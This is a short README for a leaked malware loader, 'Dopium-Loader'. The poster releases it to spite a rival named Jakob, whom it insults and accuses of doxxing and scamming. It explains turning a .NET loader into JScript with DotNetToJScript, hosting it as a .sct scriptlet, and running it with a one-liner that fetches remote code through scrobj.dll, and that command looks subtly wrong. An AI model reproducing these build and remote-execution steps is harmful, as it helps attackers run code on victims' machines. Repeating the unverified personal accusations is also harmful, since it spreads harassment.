# Dopium-Loader
Jakob has been harassing me all week and started leaking my stuff so just releasing his goofy loaders source 🤡

## How it works:
Basically this dumbass just used DotNetToJScript to convert his ass loader into a .JS file. eventually i embedded it into a .sct scriptlet and hosted it.

## How to build:

First off, open the solution file for DotNetToJScript. build as debug. now open command prompt as administrator and run:
```
"<PATH TO PROJECT>\Dopium-Loader-master\DotNetToJScript\DotNetToJScript\bin\Debug\DotNetToJScript.exe" "<PATH TO PROJECT>\Dopium-Loader-master\DotNetToJScript\ExampleAssembly\bin\Debug\ExampleAssembly.dll"
```

this will generate the script for it. i have also included the .SCT files in releases. you can upload these to a webserver and execute them using:
```
rundll32 /s /I:<link> scrobj.dll
```

Keep in mind these fellas are untrustworthy. ive also attached screenshots showing them attempting to dox other providers and confessing to scamming. enjoy.
